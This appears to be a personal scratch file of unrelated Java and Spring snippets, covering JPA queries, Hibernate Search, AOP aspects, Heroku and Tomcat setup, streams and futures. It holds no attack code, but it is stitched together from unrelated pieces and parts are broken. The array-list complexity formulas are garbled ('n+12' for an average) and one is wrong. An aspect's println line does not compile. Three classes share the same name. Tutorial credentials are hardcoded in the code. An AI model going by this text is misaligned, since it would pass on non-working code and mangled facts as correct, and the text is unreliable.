        final Iterable<ProductGetResponse> result = this.getModelMapper().mapAll(this.getProductService().getAllProductRecords(PageRequest.of(page, limit)), ProductGetResponse.class);
        return buildBodyHeaderResponse(getTotalElementsHeader(result), result);
    }
	
    @Query(value="select * from Users u where u.first_name like %:keyword% or u.last_name like %:keyword%", nativeQuery=true)
    List<UserEntity> findUsersByKeyword(@Param("keyword") String keyword);
	

    %:keyword  – ends with a value that the named parameter “keyword” holds,
    :keyword% – begins with a value that the named parameter “keyword” holds,
    %:keyword% – contains the value that the named parameter “keyword” holds,

--------------------------------------------------------------------------------------------------------
    # application properties
    server.port=8090
    # MongoDB properties
    spring.data.mongodb.uri=mongodb://appsdeveloperblog:password@ds915721.mlab.com:29670/appsdeveloperblog_db
	
   private int getDiffYears(Date first, Date last) {
       Calendar a = getCalendar(first);
       Calendar b = getCalendar(last);
       int diff = b.get(YEAR) - a.get(YEAR);
       if (a.get(MONTH) > b.get(MONTH) ||
               (a.get(MONTH) == b.get(MONTH) && a.get(DATE) > b.get(DATE))) {
           diff--;
       }
       return diff;
   }
--------------------------------------------------------------------------------------------------------
logging.level.org.hibernate.SQL=debug
logging.level.org.hibernate.type.descriptor.sql=trace
--------------------------------------------------------------------------------------------------------
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.builder.SpringApplicationBuilder;
import org.springframework.boot.web.servlet.support.SpringBootServletInitializer;
@SpringBootApplication
public class DeployableWarApplication extends SpringBootServletInitializer {
 public static void main(String[] args) {
  SpringApplication.run(DeployableWarApplication.class, args);
 }
 
 @Override
 protected SpringApplicationBuilder configure(SpringApplicationBuilder application) {
  return application.sources(DeployableWarApplication.class);
 }
}
http://appsdeveloperblog.com/create-a-deployable-war-file-with-spring-boot/
--------------------------------------------------------------------------------------------------------
    <dependency>
     <groupId>org.springframework.boot</groupId>
     <artifactId>spring-boot-starter-log4j2</artifactId>
    </dependency>
	
    <dependency>
     <groupId>org.springframework.boot</groupId>
     <artifactId>spring-boot-starter-logging</artifactId>
    </dependency>
--------------------------------------------------------------------------------------------------------
    <dependency>
     <groupId>com.amazonaws</groupId>
     <artifactId>aws-java-sdk-ses</artifactId>
    </dependency>
	
    @JsonBackReference
    private User userDetails;
	
	@JsonManagedReference
    private List<Address> addresses;
	
http://appsdeveloperblog.com/infinite-recursion-in-objects-with-bidirectional-relationships/
--------------------------------------------------------------------------------------------------------
    package com.appsdeveloperblog.ws.service.impl;
    import com.appsdeveloperblog.ws.io.dao.Database;
    import com.appsdeveloperblog.ws.io.entity.UserProfileEntity;
    import com.appsdeveloperblog.ws.service.UsersService;
    import com.appsdeveloperblog.ws.shared.dto.UserProfileDto;
    import com.appsdeveloperblog.ws.shared.exceptions.UserServiceException;
    import com.appsdeveloperblog.ws.utils.AuthenticationUtil;
    import java.security.spec.InvalidKeySpecException;
    import java.util.logging.Level;
    import java.util.logging.Logger;
    import org.springframework.beans.BeanUtils;
    import org.springframework.beans.factory.annotation.Autowired;
    import org.springframework.stereotype.Service;
     
    @Service("usersService")
    public class UsersServiceImpl implements UsersService {
        Database database;
        AuthenticationUtil authenticationUtil;
        
        @Autowired
        public UsersServiceImpl(Database database, AuthenticationUtil authenticationUtil)
        {
            this.database = database;
            this.authenticationUtil = authenticationUtil;
        }
        @Override
        public UserProfileDto saveUser(UserProfileDto userDto) throws UserServiceException {
            
            UserProfileDto returnValue = null;
            
            // Generate salt
            String salt = authenticationUtil.generateSalt(30);
            
            // Generate secure user password 
            String secureUserPassword = null;
            
            try {
                secureUserPassword = authenticationUtil.
                        generateSecurePassword(userDto.getUserPassword(), salt);
            } catch (InvalidKeySpecException ex) {
                Logger.getLogger(UsersServiceImpl.class.getName()).log(Level.SEVERE, null, ex);
                throw new UserServiceException(ex.getLocalizedMessage());
            } 
            
            //Generate secure public user id
            String securePublicUserId = authenticationUtil.generateUserId(30);
            
            userDto.setSalt(salt);
            userDto.setUserPassword(secureUserPassword); 
            userDto.setUserId(securePublicUserId);
                    
            UserProfileEntity userEntity = new UserProfileEntity();
            BeanUtils.copyProperties(userDto, userEntity);
         
            // Connect to database 
            try {
                this.database.openConnection();
                UserProfileEntity storedUserEntity = this.database.saveUserProfile(userEntity);
                if(storedUserEntity != null && storedUserEntity.getId()>0)
                {
                    returnValue = new UserProfileDto();
                    BeanUtils.copyProperties(storedUserEntity, returnValue);
                }
            }  finally {
                this.database.closeConnection();
            }
            
            return returnValue;
        }
    }
--------------------------------------------------------------------------------------------------------
    @Id
    @SequenceGenerator(
            name = "fruitsSequence",
            sequenceName = "known_fruits_id_seq",
            allocationSize = 1,
            initialValue = 10)
    @GeneratedValue(strategy = GenerationType.SEQUENCE, generator = "fruitsSequence")
    private Integer id;
--------------------------------------------------------------------------------------------------------
@ToString(exclude="email")
--------------------------------------------------------------------------------------------------------
Sort sort = builder
  .sort()
    .byField("release_date")
    .andByField("title").desc()
  .createSort();
org.apache.lucene.search.Query luceneQuery = queryBuilder
			.keyword()
			.onField("id")
			.from(50).to(100)
			.createQuery();
			
org.apache.lucene.search.Query luceneQuery = queryBuilder
			.keyword()
			.wildcard()		//it is necessary if we want to make use of wildcards
			.onFields("username", "email", "userDetail.lastName")
				.boostedTo(5f)
			.andField("userDetail.firstName")
			.matching(searchText + "*")
			.createQuery();
			
org.apache.lucene.search.Query luceneQuery = queryBuilder
              .keyword()
              .onField("email")
              .matching("edard.stark@winterfell.com")
              .createQuery();
			  
@Autowired
private EntityManager entityManager;

...

//inside UserDAO method

FullTextEntityManager fullTextEntityManager = Search.getFullTextEntityManager(entityManager);
	
QueryBuilder queryBuilder = fullTextEntityManager.getSearchFactory()
				                  .buildQueryBuilder()
				                  .forEntity(User.class)
				                  .get();
query.setSort(sort)
--------------------------------------------------------------------------------------------------------
import javax.persistence.*;
import javax.transaction.*;

import org.hibernate.search.jpa.*;
import org.springframework.context.ApplicationListener;
import org.springframework.context.event.ContextRefreshedEvent;
import org.springframework.stereotype.*;


@Component
public class UsersHibernateSearchInit implements ApplicationListener<ContextRefreshedEvent> {

	@PersistenceContext
	private EntityManager entityManager;
	

	@Override
	@Transactional
	public void onApplicationEvent(ContextRefreshedEvent event) {
		
		FullTextEntityManager fullTextEntityManager = Search.getFullTextEntityManager(entityManager);
		try {
			fullTextEntityManager.createIndexer().startAndWait();
		} catch (InterruptedException e) {
			System.out.println("Error occured trying to build Hibernate Search indexes "
					+ e.toString());
		}
	}
}
--------------------------------------------------------------------------------------------------------
  @Field(index = Index.YES, analyze=Analyze.NO, store = Store.YES)
  @DateBridge(resolution = Resolution.DAY)
  private Date createDate;
--------------------------------------------------------------------------------------------------------
@Aspect
@Component
@Order(-13)
public class RoorUserLoggingAspect{

  @Before("execution(* saveUser(..))")
  public void saveUser() {

      System.out.println("It is 1st Aspect");
  }
}

@Aspect
@Component
@Order(0)
public class RoorUserLoggingAspect{

  @Before("execution(* saveUser(..))")
  public void saveUser() {

      System.out.println("It is 2nd Aspect");
  }
}

@Aspect
@Component
@Order(75)
public class RoorUserLoggingAspect{

  @Before("execution(* saveUser(..))")
  public void saveUser() {

      System.out.println("It is 3rd Aspect");
  }
}

--------------------------------------------------------------------------------------------------------
import java.sql.Connection;
import java.sql.SQLException;
import java.util.Properties;

import javax.sql.DataSource;

import org.apache.commons.dbcp.DriverManagerConnectionFactory;
import org.apache.commons.dbcp.PoolableConnection;
import org.apache.commons.dbcp.PoolableConnectionFactory;
import org.apache.commons.dbcp.PoolingDataSource;
import org.apache.commons.pool.impl.GenericObjectPool;

public class LogsConnectionFactory {

	private static interface Singleton {
        final LogsConnectionFactory INSTANCE = new LogsConnectionFactory();
    }
	
	private final DataSource dataSource;
	
	private String datasourceURL = "jdbc:mysql://localhost:3306/library_db?autoReconnect=true&useSSL=false&useUnicode=true&useJDBCCompliantTimezoneShift=true&useLegacyDatetimeCode=false&serverTimezone=UTC";
	private String userName = "library-spring";
	private String pass = "library-spring";
	
	private LogsConnectionFactory() {		 
		
	        Properties properties = new Properties();
	        properties.setProperty("user", userName);
	        properties.setProperty("password", pass);
	        
	        
	        GenericObjectPool<PoolableConnection> pool = new GenericObjectPool<PoolableConnection>();
	        DriverManagerConnectionFactory connectionFactory = new DriverManagerConnectionFactory(
	        		datasourceURL, properties
	        );
	        
	        new PoolableConnectionFactory(
	                connectionFactory, pool, null, "SELECT 1", 3, false, false, Connection.TRANSACTION_READ_COMMITTED
	        );
	 
	        this.dataSource = new PoolingDataSource(pool);
	}
	 
	public static Connection getDatabaseConnection() throws SQLException {
	        return Singleton.INSTANCE.dataSource.getConnection();
	}
	
}

CREATE TABLE `user_logs` (
	`id` int(12) NOT NULL AUTO_INCREMENT,
    	`level` varchar(10) NOT NULL,
    	`dated` TIMESTAMP NOT  NULL DEFAULT CURRENT_TIMESTAMP,
    	`username` varchar(64) NOT NULL,
    	`field` varchar(60) NOT NULL,
    	`from_value` varchar(1000) NOT NULL DEFAULT '',
    	`to_value` varchar(1000) NOT NULL DEFAULT '',
    	`message` varchar(500) NOT NULL,
    
    	PRIMARY KEY (`id`),
    
    	KEY `user` (`username`),
    	CONSTRAINT `FK_USERNAME` FOREIGN KEY (`username`)
    	REFERENCES `user` (`username`)
    	ON DELETE NO ACTION ON UPDATE NO ACTION

)ENGINE=InnoDB DEFAULT CHARSET=utf8;
--------------------------------------------------------------------------------------------------------
apply plugin: 'com.bmuschko.tomcat'
apply plugin: 'eclipse-wtp'


buildscript {
       repositories {
             jcenter()
       }
       dependencies {
             classpath 'com.bmuschko:gradle-tomcat-plugin:2.4.1'
       }
}


dependencies {
         def tomcatVersion = '8.0.46'
         tomcat "org.apache.tomcat.embed:tomcat-embed-core:${tomcatVersion}",
         "org.apache.tomcat.embed:tomcat-embed-logging-juli:${tomcatVersion}",
         "org.apache.tomcat.embed:tomcat-embed-jasper:${tomcatVersion}"
         api 'org.apache.commons:commons-math3:3.6.1'
}


tomcat {
         httpPort = 8080
         enableSSL = true
         contextPath = '/library-spring'
}
--------------------------------------------------------------------------------------------------------
//declaring pointcuts
@Pointcut("execution(void saveUser*(..))")
public void saveUserMethod() {}

@Pointcut("within(com.wkrzywiec.library.service.*)")
public void inServicePackage() {}


//implementing pointcuts
//combine two of them
@Before("saveUserMethod() && inServicePackage()")
public void saveUserMethodInServicePackage() {
 
  System.out.println("User is saved using UserService class located in Service package.");
}

//use only one of them
@Before("saveUserMethod()")
public void saveUserMethodInAnyPackage() {
  
  System.out.println("User is saved, but don't know from which package method was used!");
}


import java.sql.SQLSyntaxErrorException;

/*here is my sample code that will catch all SQL syntax exceptions
  in service package and it will print me its stacktrace
*/
@AfterThrowing(
    pointcut="execution(* com.wkrzywiec.spring.library.service.*.*(..))",
    throwing="exec")
public void catchAllSQLSyntaxErrors(SQLSyntaxErrorException exec) {
 
  System.out.println("Here is the exception stacktrace: " + \n + exec.printStackTrace());
}
--------------------------------------------------------------------------------------------------------
dependencies {

  def springAopVersion = '5.0.4.RELEASE'
  
  compile "org.springframework:spring-aop:${springAopVersion}"
  compile 'org.aspectj:aspectjweaver:1.8.13'
  compile 'org.aspectj:aspectjrt:1.8.13'

}
--------------------------------------------------------------------------------------------------------
@AfterReturning(
    pointcut="execution(* saveUser(..))",
    returning="userID")
public void saveUserMethod(JoinPoint joinPoint, Object userID) {
 
  //getting argument passed to the method
  Object[] args = joinPoint.getArgs();
  UserDTO user = (UserDTO) args[0];
  
  //printing userID
  System.out.println("User: " + user.getUsername() + " has been assign to ID: " + userID.toString());
  
}
--------------------------------------------------------------------------------------------------------
Time/Space Complexities of an Unsorted Array List

Worst-Case Time Complexity (Unsorted Array List)

    Find: O(n) — We need to iterate over all n elements to find the query
    Insert: O(n) — If we insert at the front of the Array List, we need to move over each of the n elements
    Remove: O(n) — If we remove from the front of the Array List, we need to move over each of the n elements

Average-Case Time Complexity (Unsorted Array List)

    Find: O(n) — The average number of checks is 1+2+...+nn=∑ni=1in=n(n+1)2n=n+12


Insert: O(n) — The average number of "element moves" is n+(n−1)+...+1+0n=∑ni=0in=n(n+1)2n=n+12

Remove: O(n) — The average number of "element moves" is (n−1)+(n−2)+...+1+0n=∑n−1i=0in=n(n−1)2n=n−12


Best-Case Time Complexity (Unsorted Array List)

    Find: O(1) — The query is the first element in the Array List
    Insert: O(1) — If we insert at the end of the Array List, we don't need to move any elements
    Remove: O(1) — If we remove from the end of the Array List, we don't need to move any elements

Space Complexity (Unsorted Array List)

    O(n) — The two extremes are just before resizing (completely full, so the array is of size n) or just after resizing (array is half full, so the array is of size 2n)


Time/Space Complexities of a Sorted Array List

Worst-Case Time Complexity (Sorted Array List)

    Find: O(log n) — We can perform Binary Search to find an element
    Insert: O(n) — If we insert at the front of the Array List, we need to move over each of the n elements
    Remove: O(n) — If we remove from the front of the Array List, we need to move over each of the n elements

Average-Case Time Complexity (Sorted Array List)

    Find: O(log n) — The derivation is too complex for a summary slide, but it's the average case of Binary Search
    Insert: O(n) — The average number of "element moves" is n+(n−1)+...+1+0n=∑ni=0in=n(n+1)2n=n+12


Remove: O(n) — The average number of "element moves" is (n−1)+(n−2)+...+1+0n=∑n−1i=0in=n(n−1)2n=n2


Best-Case Time Complexity (Sorted Array List)

    Find: O(1) — The query is the first element in the Array List we check via Binary Search
    Insert: O(1) — If we insert at the end of the Array List, we don't need to move any elements
    Remove: O(1) — If we remove from the end of the Array List, we don't need to move any elements

Space Complexity (Sorted Array List)

    O(n) — The two extremes are just before resizing (completely full, so the array is of size n) or just after resizing (array is half full, so the array is of size 2n)

19
Step 1 
--------------------------------------------------------------------------------------------------------
const express = require('express');

const app = express();

app.get('/', (req, res) => {
	res.sendFile('index.html', { root : __dirname});
});

let port = process.env.PORT || 5000;
app.listen(port, () => {
	console.log(__dirname);
	console.log("Listening Port " + port);
});
--------------------------------------------------------------------------------------------------------
/**
 * <span class="startHere">&laquo; start here</span>Auto-configuration for {@link JmxService}.
 *
 * <p>
 * This auto-configuration constructs a {@link Bean} of {@link JmxServiceFactory} type if application doesn't provide its own {@link Bean}
 * of {@link JmxServiceFactory} type and if {@code 'hekate.jmx.enable'} application property is set to {@code true}.
 * </p>
 *
 * @see JmxService
 * @see HekateConfigurer
 */
@ConditionalOnHekateEnabled
@ConditionalOnMissingBean(JmxServiceFactory.class)
@ConditionalOnProperty(value = "hekate.jmx.enable", havingValue = "true")
public class HekateJmxServiceConfigurer {
    /**
     * Constructs the {@link JmxServiceFactory}.
     *
     * @return Service factory.
     */
    @Bean
    @ConfigurationProperties(prefix = "hekate.jmx")
    public JmxServiceFactory jmxServiceFactory() {
        return new JmxServiceFactory();
    }
}
--------------------------------------------------------------------------------------------------------
IntStream stream = "aibohphobia".chars(); // It returns IntStream!
IntStream oddNumbersStream = IntStream.iterate(1, x -> x + 2);
Stream<User> userStream = Stream.generate(User::new);
DoubleStream randomStream = DoubleStream.generate(Math::random);
LongStream rangedStream = LongStream.rangeClosed(100_000, 1_000_000);
String longWord = words.stream()
        .filter(w -> w.length() < 4)
        .map(String::toUpperCase)
        .distinct()
        .reduce("", String::concat); // terminal operation
		
// list of authors
final List<String> authors = javaBooks.stream()
        .flatMap(book -> book.getAuthors().stream())
        .distinct()
        .collect(Collectors.toList());
		

public static IntPredicate negateEachAndConjunctAll(Collection<IntPredicate> predicates) {
    return predicates.stream()
            .map(IntPredicate::negate)
            .reduce(n -> true, IntPredicate::and);
}

stream().collect(Collectors.toCollection(HashSet::new));

Map<Account.State, Long> sumByStates = accounts.stream()
        .collect(groupingBy(Account::getState, summingLong(Account::getBalance)));
		
Function<Integer, Stream<Integer>> f = x -> Stream.iterate(1, y -> y + 1).limit(x);
--------------------------------------------------------------------------------------------------------
  import java.util.Optional;
   
  public class Example03 {
      
      public static Optional<Double> multiplyBy2(double n) {
          return Optional.of(n * 2);
      }
      
      public static Optional<Double> divideBy3(double n) {
          return Optional.of(n/3);    
      }
      
      public static Optional<Double> round(double n) {
          return Optional.of(Double.valueOf(Math.round(n)));
      }
      
      public static Optional<Double> applyOperation(double n1) {
          return multiplyBy2(n1)
                    .flatMap(n -> divideBy3(n))
                    .flatMap(n -> round(n));
      }
   
      public static void main(String[] args) {                
          System.out.println("Output = " + applyOperation(12).get());
      }    
  }


Read more: http://mrbool.com/getting-started-with-java-monads/34302#ixzz5yzGLLuui

--------------------------------------------------------------------------------------------------------
throw Throwables.propagate(e);
--------------------------------------------------------------------------------------------------------

            return Pattern
                // Compile splitter into a regular expression (regex).
                .compile(splitter)

                // Use the regex to split the file into a stream of
                // strings.
                .splitAsStream(bytes)

                // Filter out any empty strings.
                .filter(((Predicate<String>) String::isEmpty).negate())
                
                // Collect the results into a string.
                .collect(toList());
--------------------------------------------------------------------------------------------------------
<dependency>
  <groupId>org.jscience</groupId>
  <artifactId>jscience</artifactId>
  <version>4.3.1</version>
</dependency>
--------------------------------------------------------------------------------------------------------
sudo snap install heroku --classic
heroku login
heroku create

git push heroku master

heroku ps:scale web=1
heroku open
heroku logs --tail
web: java -jar target/java-getting-started-1.0.jar
heroku ps
heroku ps:scale web=0
heroku ps:scale web=1
heroku local web
heroku open hello
heroku config:set ENERGY="20 GeV"
heroku config
heroku run java -version
heroku addons
heroku addons:open papertrail
heroku pg
heroku pg:psql


<plugin>
  <groupId>org.liquibase</groupId>
  <artifactId>liquibase-maven-plugin</artifactId>
  <configuration>
    <changeLogFile>src/main/resources/db/changelog/db.changelog-master.yaml</changeLogFile>
    <url>${env.JDBC_DATABASE_URL}</url>
  </configuration>
</plugin>

<plugin>
  <groupId>org.flywaydb</groupId>
  <artifactId>flyway-maven-plugin</artifactId>
  <configuration>
    <url>${env.JDBC_DATABASE_URL}</url>
  </configuration>
</plugin>


java -jar target/dependency/liquibase.jar --changeLogFile=src/main/resources/db/changelog/db.changelog-master.yaml --url=$JDBC_DATABASE_URL --classpath=target/dependency/postgres.jar update
mvn -s settings.xml dependency:list
heroku config:set MAVEN_SETTINGS_PATH=support/jboss-settings.xml

heroku run bash
--------------------------------------------------------------------------------------------------------
$ mvn heroku:deploy
$ HEROKU_API_KEY="xxx-xxx-xxxx" mvn heroku:deploy
$ mvn heroku:run-war


    mvn heroku:deploy-only deploys without running package or vendoring dependencies
    mvn heroku:dashboard opens the Dashboard for the application on Heroku.com
    mvn heroku:eclipse-launch-config generates launch configurations for Eclipse IDE
    mvn heroku:run-war runs a war file locally

--------------------------------------------------------------------------------------------------------
    /**
     * HTTP Accept header model.
     */
    public static enum Accept implements Header {
        JSON("application/json"),
        TEXT("text/plain");

        private String value;
        static String ACCEPT = "Accept";

        Accept(String val) {
            this.value = val;
        }

        @Override
        public String getHeaderName() {
            return ACCEPT;
        }

        @Override
        public String getHeaderValue() {
            return value;
        }

    }

    /**
     * HTTP Status codes. Not all are implemented. Only those used by the Heroku API.
     */
    public static enum Status {
        OK(200), CREATED(201), ACCEPTED(202), PAYMENT_REQUIRED(402), FORBIDDEN(403), NOT_FOUND(404), UNPROCESSABLE_ENTITY(422), INTERNAL_SERVER_ERROR(500), SERVICE_UNAVAILABLE(503);

        public final int statusCode;

        Status(int statusCode) {
            this.statusCode = statusCode;
        }

        public boolean equals(int code) {
            return statusCode == code;
        }
    }
}
--------------------------------------------------------------------------------------------------------
git log --graph --all --pretty=format:'%C(yellow)%h -%C(auto)%d %C(bold cyan)%s %C(bold white)(%cr)%Creset %C(dim white)<%an>'


    %h - abbreviated commit hash.
    %d - shows the different branch names.
    %s - adds the commit message.
    %cr - one of many date placeholders. This particular one shows how long ago the commit was created.
    %an - adds the author of the commit.
    %C(...) - sets the color you define in the brackets
    %Creset - resets the color
git config --global alias.lg "log --graph --all --pretty=format:'%C(yellow)%h -%C(auto)%d %C(bold cyan)%s %C(bold white)(%cr)%Creset %C(dim white)<%an>'"
--------------------------------------------------------------------------------------------------------    public static void runInTransaction(Transaction transaction) throws Exception {

        Connection dbConnection = createDatabaseConnection();
        dbConnection.setAutoCommit(false);

        try {

            System.out.println("Starting transaction");
            transaction.execute(dbConnection);


            System.out.println("Committing transaction");
            dbConnection.commit();

        } catch (Exception e) {

            System.out.println(e.getMessage());
            System.out.println("Rolling back...");
            dbConnection.rollback();
        } finally {
            dbConnection.close();
        }
    }

    private static Connection createDatabaseConnection() throws Exception {

        Class.forName("com.mysql.jdbc.Driver");
        return DriverManager.getConnection("jdbc:mysql://localhost:3306/ticket_system", "user", "password");
    }
	    public static void runInTransaction(Transaction transaction) throws Exception {

        Connection dbConnection = createDatabaseConnection();
        dbConnection.setAutoCommit(false);

        try {

            System.out.println("Starting transaction");
            transaction.execute(dbConnection);


            System.out.println("Committing transaction");
            dbConnection.commit();

        } catch (Exception e) {

            System.out.println(e.getMessage());
            System.out.println("Rolling back...");
            dbConnection.rollback();
        } finally {
            dbConnection.close();
        }
    }

    private static Connection createDatabaseConnection() throws Exception {

        Class.forName("com.mysql.jdbc.Driver");
        return DriverManager.getConnection("jdbc:mysql://localhost:3306/ticket_system", "user", "password");
    }
package com.deadcoderising;

import javax.servlet.ServletContextEvent;  
import javax.servlet.ServletContextListener;

public class ExampleContextListener implements ServletContextListener {

    @Override
    public void contextInitialized(ServletContextEvent servletContextEvent) {
        System.out.println("Starting up!");
    }

    @Override
    public void contextDestroyed(ServletContextEvent servletContextEvent) {
        System.out.println("Shutting down!");
    }
}
@WebListener
public class ExampleContextListener implements ServletContextListener {  
    // ...
}
IntStream.range(1, 5).max().getAsInt();  
// > 4
IntStream.range(1, 5).min().getAsInt();  
IntStream.range(1, 5).parallel().forEach(i -> heavyOperation());  


--------------------------------------------------------------------------------------------------------
public class PublishArticlesUseCase {

    private Publisher publisher;

    public PublishArticlesUseCase(Publisher publisher) {
        this.publisher = publisher;
    }

    public List<PublishResult> publishArticles(List<Article> articles) throws InterruptedException, ExecutionException {

        ExecutorService executorService = Executors.newSingleThreadExecutor();

        return articles.stream()
                .map(article -> {

                    Future<PublishResult> task = executorService.submit(() -> publisher.publish(article));

                    try {
                        return task.get(10, TimeUnit.SECONDS);
                    } catch (InterruptedException | ExecutionException | TimeoutException e) {
                        return PublishResult.FAILED(article);
                    }
                })
                .collect(Collectors.toList());
    }
}
--------------------------------------------------------------------------------------------------------
Collector.of(  
  () -> new int[1],
  (result, article) -> result[0] += article.getWordCount(),
  (result1, result2) -> {
    result1[0] += result2[0];
    return result1;
  },
  total -> total[0] 
);

map.merge("Java", javaArticles, (list1, list2) ->  
  Stream.of(list1, list2)
    .flatMap(Collection::stream)
    .collect(Collectors.toList()));
	
 map.reduceValues(1, List::size, (total, elem) -> total + elem);
 
Function<List<Article>, List<Article>> sortByDate =  
    articles -> articles.stream()
        .sorted((x, y) -> y.published().compareTo(x.published()))
        .collect(Collectors.toList());

Function<List<Article>, Optional<Article>> first =  
    a -> a.stream().findFirst();
	
Function<List<Article>, Optional<Article>> newest =  
    first.compose(sortByDate);
--------------------------------------------------------------------------------------------------------
ExecutorService executor = Executors.newFixedThreadPool(4);

List<String> topSites = Arrays.asList(
        "www.google.com", "www.youtube.com", "www.yahoo.com", "www.msn.com"
);

List<CompletableFuture<Double>> relevanceFutures = topSites.stream().
        map(site -> CompletableFuture.supplyAsync(() -> downloadSite(site), executor)).
        map(contentFuture -> contentFuture.thenApply(this::parse)).
        map(docFuture -> docFuture.thenCompose(this::calculateRelevance)).
        collect(Collectors.<CompletableFuture<Double>>toList());
--------------------------------------------------------------------------------------------------------
CompletableFuture.supplyAsync(this::hangingMsg)  
                 .completeOnTimeout(new Result(Status.TIMED_OUT),1, TimeUnit.MINUTES);
CompletableFuture.supplyAsync(this::hangingMsg)  
                 .orTimeout(1, TimeUnit.MINUTES);
--------------------------------------------------------------------------------------------------------
@Configuration
@ConditionalOnMissingBean(Hekate.class)
@ConditionalOnProperty(name = "hekate.enable", havingValue = "true", matchIfMissing = true)
--------------------------------------------------------------------------------------------------------
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.CompletionStage;

public class Results {

    public static final CompletionStage<Object> NOT_FOUND = CompletableFuture.completedFuture(Result.NOT_FOUND);
    
    public enum Result {
        
        NOT_FOUND,
    }
}
--------------------------------------------------------------------------------------------------------
    /**
     * Generate the MD5 hash out of the given {@link ByteBuffer}
     */
    private static String md5(byte[] buffer) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            md.update(buffer);
            byte[] digest = md.digest();
            return new String(FlexBase64.encodeBytes(digest, 0, digest.length, false), StandardCharsets.US_ASCII);
        } catch (NoSuchAlgorithmException e) {
            // Should never happen
            throw new InternalError("MD5 not supported on this platform");
        }
    }
--------------------------------------------------------------------------------------------------------
    public static class Builder {

        private final Map<UndertowOption<?>, Object> values = new HashMap<>();

        public <T> Builder set(UndertowOption<T> option, T value) {
            values.put(option, value);
            return this;
        }

        public Builder addAll(UndertowOptionMap workerOptions) {
            values.putAll(workerOptions.values);
            return this;
        }

        public UndertowOptionMap getMap() {
            return new UndertowOptionMap(new HashMap<>(values));
        }
    }
--------------------------------------------------------------------------------------------------------

import org.reactivestreams.Publisher;

import io.quarkus.qute.PublisherFactory;
import io.quarkus.qute.Template.Rendering;
import io.reactivex.Flowable;
import io.reactivex.processors.UnicastProcessor;

public class RxjavaPublisherFactory implements PublisherFactory {

    @Override
    public Publisher<String> createPublisher(Rendering rendering) {
        return Flowable.defer(() -> {
            UnicastProcessor<String> processor = UnicastProcessor.create();
            rendering.consume(s -> processor.onNext(s))
                    .whenComplete((v, t) -> {
                        if (t == null) {
                            processor.onComplete();
                        } else {
                            processor.onError(t);
                        }
                    });
            return processor;
        });
    }

}
--------------------------------------------------------------------------------------------------------
kogito
keycloak
--------------------------------------------------------------------------------------------------------
    server.servlet.context-path=/mobile-app-ws
    server.port=8888
--------------------------------------------------------------------------------------------------------
    <!-- https://mvnrepository.com/artifact/org.junit.jupiter/junit-jupiter-engine -->
    <dependency>
     <groupId>org.junit.jupiter</groupId>
     <artifactId>junit-jupiter-engine</artifactId>
     <scope>test</scope>
    </dependency>
    <!-- https://mvnrepository.com/artifact/org.junit.platform/junit-platform-launcher -->
    <dependency>
     <groupId>org.junit.platform</groupId>
     <artifactId>junit-platform-launcher</artifactId>
     <version>1.2.0</version>
     <scope>test</scope>
    </dependency>
--------------------------------------------------------------------------------------------------------
mvn spring-boot:run -Dspring-boot.run.arguments=--spring.profiles.active=production

    @SpringBootApplication
    public class ProfilesTutorialApplication {
        public static void main(String[] args) {
            SpringApplication.run(ProfilesTutorialApplication.class, args);
        }
        @Profile("production")
        @Bean
        public DatabaseConfiguration getProdDatabaseConfiguration() {
            return new AppConfigurationProd();
        }
        @Profile("developer")
        @Bean
        public DatabaseConfiguration getDevDatabaseConfiguration() {
            return new AppConfigurationDev();
        }
    }
--------------------------------------------------------------------------------------------------------
    @Override
    public List<Person> findByBirthDateAfter(Date date) {
       Query query = new Query();
       query.addCriteria(Criteria.where("dateOfBirth").gt(date));
       return mongoTemplate.find(query, Person.class);
    }
    @Override
    public List<Person> findByAgeRange(int lowerBound, int upperBound) {
       Query query = new Query();
       query.addCriteria(Criteria.where("age").gt(lowerBound)
               .andOperator(Criteria.where("age").lt(upperBound)));
       return mongoTemplate.find(query, Person.class);
    }
    @Override
    public List<Person> findByFavoriteBooks(String favoriteBook) {
       Query query = new Query();
       query.addCriteria(Criteria.where("favoriteBooks").in(favoriteBook));
       return mongoTemplate.find(query, Person.class);
    }
--------------------------------------------------------------------------------------------------------
    # Enabling H2 Console
    spring.h2.console.enabled=true
--------------------------------------------------------------------------------------------------------
    curl -X PUT \
      http://localhost:8080/api/users/2d8d4927572642cebccdf5257880a393 \
      -H 'cache-control: no-cache' \
      -H 'content-type: application/json' \
      -d '{
      "lastName":"Kargopolov",
      "firstName":"Sergey"
    }'
--------------------------------------------------------------------------------------------------------
    @GetMapping()
    public String getUsers(@RequestParam(value = "page", defaultValue = "1") int page,
               @RequestParam(value = "limit", defaultValue = "30") int limit)
    {
     return "get users was called. </br> Page = " + page  + " and limit = " +  limit;
    }
	    @GetMapping()
    public String getUsers(@RequestParam(value = "sort", required=false) String sort)
    {
     return "get users was called with Sort option = " + sort;
    }
--------------------------------------------------------------------------------------------------------
function* getEvenNumbers(start, end) {
    for (let i = start; i <= end; i++) {
        if (i % 2 == 0) {
            yield i;
        }
    }
}

//using for-of loop
let evenNumbers = getEvenNumbers(3, 9);
for (let n of evenNumbers) {
    console.log(n);
}

//using next() method
evenNumbers = getEvenNumbers(3, 9);
let temp = { done: false }
while (!temp.done) {
    console.log(temp = evenNumbers.next());
}
--------------------------------------------------------------------------------------------------------
keytool -genkey -noprompt -alias <your-alias> -keyalg RSA -keystore <your-file-name> -keypass <your-password>
    -storepass <your-password> -dname "CN=<your-cert-name>, OU=<your-organization-unit>, O=<your-organization>,
    L=<your-location>, ST=<state>, C=<two-letter-country-code>"
	
<Server ...>
 ....
   <Service name="Catalina">
     .....
      <Connector
         protocol="org.apache.coyote.http11.Http11NioProtocol"
         port="8443" maxThreads="200"
         scheme="https" secure="true" SSLEnabled="true"
         keystoreFile="C:\my-cert-dir\localhost-rsa.jks"
         keystorePass="123456"
         clientAuth="false" sslProtocol="TLS"/>
     .....
   </Service>
</Server>

 <plugin>
     <groupId>org.apache.tomcat.maven</groupId>
     <artifactId>tomcat7-maven-plugin</artifactId>
     <version>2.2</version>
     <configuration>
         <path>/</path>
         <httpsPort>8443</httpsPort>
         <keystoreFile>C:\my-cert-dir\localhost-rsa.jks</keystoreFile>
         <keystorePass>123456</keystorePass>
     </configuration>
 </plugin>
 
 mvn tomcat7:run-war
--------------------------------------------------------------------------------------------------------
import com.mongodb.client.*;
import org.bson.Document;

public class QueryCollectionExample {
    public static void main(String[] args) {
        MongoClient mongoClient = MongoClients.create("mongodb://localhost:27017");
